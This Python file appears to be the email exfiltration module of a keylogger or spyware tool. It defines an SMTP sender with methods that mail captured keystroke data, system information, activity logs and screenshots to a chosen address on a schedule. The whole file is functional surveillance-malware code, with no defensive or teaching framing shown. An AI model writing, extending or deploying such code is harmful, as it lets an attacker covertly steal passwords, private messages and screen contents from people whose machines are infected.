"""
Email Alert Module
Sends email notifications with captured data and attachments
"""

import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.image import MIMEImage
from email import encoders
from datetime import datetime
import os


class EmailAlertSystem:
    """Send email notifications and alerts"""
    
    def __init__(self, sender_email, sender_password, smtp_server="smtp.gmail.com", smtp_port=587):
        """
        Initialize email alert system
        
        Args:
            sender_email (str): Email address to send from
            sender_password (str): Email password or app-specific password
            smtp_server (str): SMTP server address
            smtp_port (int): SMTP server port
        """
        self.sender_email = sender_email
        self.sender_password = sender_password
        self.smtp_server = smtp_server
        self.smtp_port = smtp_port
    
    def send_alert(self, recipient_email, subject, body, attachments=None):
        """
        Send email alert
        
        Args:
            recipient_email (str): Email address to send to
            subject (str): Email subject
            body (str): Email body content
            attachments (list): List of file paths to attach
            
        Returns:
            bool: True if successful, False otherwise
        """
        try:
            # Create message
            message = MIMEMultipart("alternative")
            message["Subject"] = subject
            message["From"] = self.sender_email
            message["To"] = recipient_email
            
            # Add body
            text_part = MIMEText(body, "plain")
            message.attach(text_part)
            
            # Add attachments if provided
            if attachments:
                for file_path in attachments:
                    if os.path.exists(file_path):
                        self._attach_file(message, file_path)
            
            # Send email
            with smtplib.SMTP(self.smtp_server, self.smtp_port) as server:
                server.starttls()
                server.login(self.sender_email, self.sender_password)
                server.sendmail(self.sender_email, recipient_email, message.as_string())
            
            print(f"[*] Alert email sent to {recipient_email}")
            return True
            
        except Exception as e:
            print(f"Error sending email: {e}")
            return False
    
    def _attach_file(self, message, file_path):
        """
        Attach a file to email
        
        Args:
            message: Email message object
            file_path (str): Path to file to attach
        """
        try:
            filename = os.path.basename(file_path)
            
            # Check if it's an image
            if file_path.lower().endswith(('.png', '.jpg', '.jpeg', '.bmp', '.gif')):
                with open(file_path, 'rb') as attachment:
                    part = MIMEImage(attachment.read())
                    part.add_header('Content-Disposition', 'attachment', filename=filename)
                    message.attach(part)
            else:
                # Attach as generic file
                with open(file_path, 'rb') as attachment:
                    part = MIMEBase('application', 'octet-stream')
                    part.set_payload(attachment.read())
                    encoders.encode_base64(part)
                    part.add_header('Content-Disposition', 'attachment', filename=filename)
                    message.attach(part)
            
            print(f"[*] Attached file: {filename}")
            
        except Exception as e:
            print(f"Error attaching file {file_path}: {e}")
    
    def send_keystroke_report(self, recipient_email, keystroke_data, attachments=None):
        """
        Send keystroke report via email
        
        Args:
            recipient_email (str): Email address to send to
            keystroke_data (str): Keystroke data to send
            attachments (list): Optional list of attachment paths
            
        Returns:
            bool: True if successful, False otherwise
        """
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        subject = f"[KEYSTROKE REPORT] {timestamp}"
        
        body = f"""
Keystroke Report
================
Timestamp: {timestamp}

Captured Data:
--------------
{keystroke_data[:500]}...

Report Generated at: {timestamp}
        """
        
        return self.send_alert(recipient_email, subject, body, attachments)
    
    def send_system_report(self, recipient_email, system_info, attachments=None):
        """
        Send system information report via email
        
        Args:
            recipient_email (str): Email address to send to
            system_info (dict): System information dictionary
            attachments (list): Optional list of attachment paths
            
        Returns:
            bool: True if successful, False otherwise
        """
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        subject = f"[SYSTEM REPORT] {timestamp}"
        
        info_text = "\n".join([f"{k}: {v}" for k, v in system_info.items()])
        
        body = f"""
System Information Report
==========================
Timestamp: {timestamp}

System Details:
---------------
{info_text}

Report Generated at: {timestamp}
        """
        
        return self.send_alert(recipient_email, subject, body, attachments)
    
    def send_periodic_report(self, recipient_email, log_file, screenshot_files=None):
        """
        Send periodic report with logs and screenshots
        
        Args:
            recipient_email (str): Email address to send to
            log_file (str): Path to log file
            screenshot_files (list): Optional list of screenshot file paths
            
        Returns:
            bool: True if successful, False otherwise
        """
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        subject = f"[PERIODIC REPORT] {timestamp}"
        
        # Read log file
        log_content = ""
        if os.path.exists(log_file):
            try:
                with open(log_file, 'r', encoding='utf-8') as f:
                    log_content = f.read()[-1000:]  # Last 1000 characters
            except Exception as e:
                log_content = f"Error reading log: {e}"
        
        body = f"""
Periodic Activity Report
========================
Timestamp: {timestamp}

Recent Activity:
----------------
{log_content}

Report Generated at: {timestamp}
        """
        
        attachments = screenshot_files if screenshot_files else []
        if os.path.exists(log_file):
            attachments.append(log_file)
        
        return self.send_alert(recipient_email, subject, body, attachments if attachments else None)


if __name__ == "__main__":
    # Example usage (requires actual email credentials)
    print("[*] Email Alert System Module")
    print("[*] Configure with your email credentials in config.json")
